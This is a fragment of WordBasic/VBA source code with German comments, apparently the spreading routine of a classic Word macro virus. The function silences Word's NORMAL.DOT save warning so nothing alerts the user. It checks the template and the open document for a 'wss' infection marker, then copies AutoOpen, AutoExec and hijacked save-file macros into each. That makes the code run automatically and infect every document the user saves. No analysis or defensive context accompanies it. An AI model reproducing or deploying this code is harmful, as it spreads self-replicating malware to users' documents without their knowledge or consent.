   Private Function Makkop(Name_$)
   Dim I
   Dim X
   Dim CopyMakros

   Dim GlPres
   Dim AcPres

   Makkop = 0

   GlPres = 0
   AcPres = 0

   ' Disable NORMAL.DOT write access warnings
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

   ' Check If we in Global template
   For I = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](I, 0) = "wss" Then
      GlPres = 1   '  Schon erledigt
   End If
   Next I

   ' Check if document allready infected
   X = WordBasic.CountMacros(1)
   If (X = 0) Then GoTo SkAcCheck

   For I = 1 To WordBasic.CountMacros(1)
   If WordBasic.[MacroName$](I, 1) = "wss" Then
      AcPres = 1   ' Schon erledigt
   End If
   Next I

   SkAcCheck:


   If GlPres = 0 Then

      WordBasic.MacroCopy Name_$ + ":DateiSpeichern", "DateiSpeichern", 0
      WordBasic.MacroCopy Name_$ + ":DateiSpeichernUnter", "DateiSpeichernUnter", 0
      WordBasic.MacroCopy Name_$ + ":AutoOpen", "AutoOpen", 0
      WordBasic.MacroCopy Name_$ + ":AutoExec", "AutoExec", 0
      WordBasic.MacroCopy Name_$ + ":wss", "wss", 0

   End If

   If AcPres = 0 Then

      CopyMakros = 1
      WordBasic.MacroCopy "DateiSpeichern", Name_$ + ":DateiSpeichern", 0
      WordBasic.MacroCopy "DateiSpeichernUnter", Name_$ + ":DateiSpeichernUnter", 0
      WordBasic.MacroCopy "AutoOpen", Name_$ + ":AutoOpen", 0
      WordBasic.MacroCopy "AutoExec", Name_$ + ":AutoExec", 0
      WordBasic.MacroCopy "wss", Name_$ + ":wss", 0

   End If
   End Function
